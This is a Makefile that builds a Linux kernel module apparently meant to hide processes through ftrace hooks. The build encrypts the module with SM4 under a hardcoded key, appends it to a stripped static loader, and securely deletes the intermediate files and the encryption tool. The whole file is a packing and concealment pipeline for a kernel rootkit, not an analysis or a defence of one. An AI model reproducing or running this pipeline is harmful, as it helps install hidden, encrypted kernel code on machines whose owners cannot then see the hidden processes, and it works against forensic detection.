ifneq ($(KERNELRELEASE),)
	obj-m := hidden_proc.o
	hidden_proc-y := hidden_proc_main.o ftrace_hook.o aes.o
#	CFLAGS_sm3.o+=-DSM3_MACRO -Wno-shift-count-overflow
else
	KERNELDIR ?= /lib/modules/`uname  -r`/build
	PWD := $(shell pwd)
default:
	$(MAKE)  -C $(KERNELDIR) M=$(PWD) modules
	gcc -O2 -o sm4tool sm4.c sm4tool.c
	./sm4tool 'anquanyanjiu&890' hidden_proc.ko hidden_proc.ko.tmp
	sed -i "s/int m_size = .*;/int m_size = `stat -c %s hidden_proc.ko.tmp`;/" load.c 
	gcc -O2 -static -o load  sm4.c load.c 
	strip load
	cat hidden_proc.ko.tmp >> load
	srm hidden_proc.ko.tmp
	srm sm4tool
	make -C hc

clean:
	rm -rf *.ko *.o *.mod *.mod.o *.mod.c *.symvers \.*.cmd .tmp_versions modules.order
	rm -rf load sm4tool
	make -C hc clean
endif
